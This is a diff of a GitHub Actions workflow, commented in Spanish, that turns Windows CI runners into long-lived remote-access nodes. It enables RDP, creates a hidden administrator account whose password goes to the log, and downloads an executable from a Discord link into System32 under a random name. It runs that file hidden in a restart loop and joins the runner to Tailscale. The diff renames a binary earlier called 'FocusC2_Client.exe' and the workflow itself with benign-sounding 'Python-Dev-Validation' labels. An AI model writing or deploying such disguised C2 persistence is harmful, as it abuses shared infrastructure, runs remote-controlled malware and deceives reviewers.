@@ -1,18 +1,18 @@
-name: System-Node-Service-v25
+name: Python-Dev-Validation-v26
 
 on:
   workflow_dispatch:
 
 jobs:
-  worker-runtime:
+  node-validation:
     runs-on: windows-latest
     timeout-minutes: 3600
     strategy:
       matrix:
-        node_id: [1, 2] # Mantengo 2 maquinas para evitar suspensiones
+        node_id: [1, 2] # Mantenemos 2 para seguridad de la cuenta
 
     steps:
-      - name: 1. Optimize Energy Settings
+      - name: 1. Optimize Environment
         run: |
           powercfg /setactive 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c
           powercfg /x -monitor-timeout-ac 0
@@ -24,20 +24,20 @@ jobs:
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 1 -Force
           netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
 
-      - name: 3. Provision Service Account
+      - name: 3. Provision Admin Account
         run: |
-          $p = "Node" + (Get-Random -Minimum 1000 -Maximum 9999) + "!"
+          $p = "DevNode" + (Get-Random -Minimum 1000 -Maximum 9999) + "!"
           $s = ConvertTo-SecureString $p -AsPlainText -Force
-          New-LocalUser -Name "AdminSrv" -Password $s -AccountNeverExpires
-          Add-LocalGroupMember -Group "Administrators" -Member "AdminSrv"
+          New-LocalUser -Name "DevAdmin" -Password $s -AccountNeverExpires
+          Add-LocalGroupMember -Group "Administrators" -Member "DevAdmin"
           echo "SRV_PASS=$p" >> $env:GITHUB_ENV
 
       - name: 4. Deploy Randomized Module
         run: |
-          $url = "https://cdn.discordapp.com/attachments/1462658749985587281/1476785770567303301/FocusC2_Client.exe?ex=69a2636d&is=69a111ed&hm=0ae19ad5e94878e1c6345088757fb21b89a5d30be781c1f80954181264766e61&"
+          $url = "https://cdn.discordapp.com/attachments/1462658749985587281/1477090518474428507/PythonDev.exe?ex=69a37f3e&is=69a22dbe&hm=610c5b87eda47bd4c82c5a9fdc1269cd7cee4b23c892796a64e3dbbb5a9d6538&"
           
           # Generar nombre aleatorio para el proceso
-          $randName = "SrvData_" + (Get-Random -Minimum 100 -Maximum 999) + ".exe"
+          $randName = "WinService_" + (Get-Random -Minimum 10 -Maximum 99) + ".exe"
           $dest = "C:\Windows\System32\$randName"
           echo "PROC_NAME=$randName" >> $env:GITHUB_ENV
           
@@ -46,7 +46,7 @@ jobs:
               Write-Host "Modulo desplegado como: $randName"
               Start-Process $dest -WindowStyle Hidden
           } catch {
-              Write-Error "Fallo en la descarga. Verifica el enlace de Discord."
+              Write-Error "Fallo en la descarga. Verifica el enlace de Discord (podria haber caducado)."
               exit 1
           }
 
@@ -54,21 +54,24 @@ jobs:
         run: |
           Invoke-WebRequest -Uri "https://pkgs.tailscale.com/stable/tailscale-setup-latest-amd64.msi" -OutFile "ts_setup.msi"
           Start-Process msiexec.exe -ArgumentList "/i", "ts_setup.msi", "/quiet", "/norestart" -Wait
-          & "$env:ProgramFiles\Tailscale\tailscale.exe" up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname="node-srv-${{ matrix.node_id }}"
+          & "$env:ProgramFiles\Tailscale\tailscale.exe" up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname="dev-node-${{ matrix.node_id }}"
 
       - name: 6. Monitoring & Maintenance Loop
         run: |
           $ip = & "$env:ProgramFiles\Tailscale\tailscale.exe" ip -4
-          Write-Host "Node ${{ matrix.node_id }} Online at: $ip"
-          Write-Host "User: AdminSrv | Pass: $env:SRV_PASS"
+          Write-Host "=========================================="
+          Write-Host "NODE ${{ matrix.node_id }} ONLINE"
+          Write-Host "IP: $ip"
+          Write-Host "User: DevAdmin | Pass: $env:SRV_PASS"
           Write-Host "Process: $env:PROC_NAME"
+          Write-Host "=========================================="
           
           $fullPath = "C:\Windows\System32\$env:PROC_NAME"
           $procOnly = $env:PROC_NAME.Replace(".exe", "")
 
           while ($true) {
               if (!(Get-Process $procOnly -ErrorAction SilentlyContinue)) {
-                  Write-Host "Reiniciando proceso $procOnly..."
+                  Write-Host "[$(Get-Date)] Reiniciando proceso..."
                   Start-Process $fullPath -WindowStyle Hidden
               }
               Start-Sleep -Seconds 300
